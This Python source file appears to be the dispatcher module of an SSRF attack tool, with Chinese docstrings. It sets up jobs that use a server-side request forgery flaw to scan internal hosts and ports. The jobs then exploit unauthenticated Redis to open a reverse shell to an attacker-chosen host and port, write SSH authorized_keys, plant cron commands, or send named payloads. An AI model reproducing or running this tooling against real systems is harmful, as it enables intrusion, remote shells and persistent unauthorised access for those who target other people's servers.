#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : mr.chery (mr.chery666@gmail.com)

from tasks import ssrf_check, ssrf_scan, redis_shell_task, redis_ssh_key, redis_cron_command_task, payload_attack_task
from ssrf import Job, JobSerializer
import logging
_log = logging.getLogger(__name__)


def attack_method_switch(**kwargs):
    """
    攻击方式选择
    :param kwargs: 攻击参数
    :return: 调用对应的攻击函数
    """
    if kwargs.get("attack_method") == "scan":
        url = kwargs.get("url")
        ip_pool = kwargs.get("ip_pool")
        param = kwargs.get("param")
        scan(url, ip_pool, param)
    if kwargs.get("attack_method") == "redis_shell":
        redis_shell(**kwargs)
    if kwargs.get("attack_method") == "redis_authorized_keys":
        redis_authorized_keys(**kwargs)
    if kwargs.get("attack_method") == "redis_cron_command":
        redis_cron_command(**kwargs)
    if kwargs.get("payload_name") is not None:
        payload_type(**kwargs)


def check(url, data):
    """
    ssrf检测函数
    :param url: 待检测url
    :return:
    """
    _log.info("ssrf check job start")
    job = Job(url=url, data=data)
    job.save()
    ssrf_check(job)
    return JobSerializer().dump(job).data


def scan(url, ip_pool, param):
    """
    利用ssrf进行内网存活ip和端口扫描
    :param url: 存在ssrf的漏洞url
    :param ip_pool: 待扫描待ip段
    :param param: 存在ssrf漏洞的参数
    :return:
    """
    _log.info("ssrf scan job start")
    job = Job(url=url, ip_pool=ip_pool, param=param)
    job.save()
    ssrf_scan(job)
    return JobSerializer().dump(job).data


def redis_shell(**kwargs):
    """
    利用redis未授权反弹shell任务初始化
    :param kwargs:
    :return:
    """
    _log.info("ssrf attack redis job start")
    url = kwargs.get("url")
    param = kwargs.get("param")
    host = kwargs.get("host")
    port = kwargs.get("port")
    bhost = kwargs.get("bhost")
    bport = kwargs.get("bport")
    job = Job(url=url, param=param, redis_host=host, redis_port=port, shell_host=bhost, shell_port=bport)
    job.save()
    redis_shell_task(job)


def redis_authorized_keys(**kwargs):
    """
    利用redis未授权反弹shell任务初始化
    :param kwargs:
    :return:
    """
    _log.info("ssrf attack redis job start")
    url = kwargs.get("url")
    param = kwargs.get("param")
    host = kwargs.get("host")
    port = kwargs.get("port")
    authorized_keys = kwargs.get("authorized_keys")
    job = Job(url=url, param=param, redis_host=host, redis_port=port, authorized_keys=authorized_keys)
    job.save()
    redis_ssh_key(job)


def redis_cron_command(**kwargs):
    """
    利用redis未授权反弹shell任务初始化
    :param kwargs:
    :return:
    """
    _log.info("ssrf attack redis job start")
    url = kwargs.get("url")
    param = kwargs.get("param")
    host = kwargs.get("host")
    port = kwargs.get("port")
    command = kwargs.get("command")
    job = Job(url=url, param=param, redis_host=host, redis_port=port, cron_command=command)
    job.save()
    redis_cron_command_task(job)


def payload_type(**kwargs):
    _log.info("ssrf payload attack job start")
    url = kwargs.get("url")
    param = kwargs.get("param")
    host = kwargs.get("host")
    payload_name = kwargs.get("payload_name")
    job = Job(url=url, param=param, payload_host=host, payload_name=payload_name)
    job.save()
    payload_attack_task(job)
